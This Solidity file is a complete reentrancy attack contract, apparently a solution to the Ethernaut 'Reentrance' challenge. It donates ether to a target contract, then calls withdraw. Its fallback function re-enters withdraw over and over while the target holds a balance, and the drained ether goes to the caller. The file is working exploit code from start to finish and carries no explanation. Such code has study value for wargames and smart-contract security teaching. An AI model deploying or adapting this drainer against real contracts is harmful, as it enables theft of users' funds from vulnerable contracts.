// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

interface IReentrance {
    function donate(address _to) external payable;

    function withdraw(uint _amount) external;
}

contract AttackReentrance {
    IReentrance immutable private _TARGET;
    uint immutable private _AMOUNT;

    constructor(IReentrance target, uint amount) payable {
        _TARGET = target;
        _AMOUNT = amount;
    }

    fallback() external payable {
        if (address(_TARGET).balance != 0) {
            _TARGET.withdraw(_AMOUNT);
        }
    }

    function attack() external payable {
        _TARGET.donate{value: _AMOUNT}(address(this));
        _TARGET.withdraw(_AMOUNT);
        // refund all eth to eoa
        payable(msg.sender).transfer(address(this).balance);
    }
}
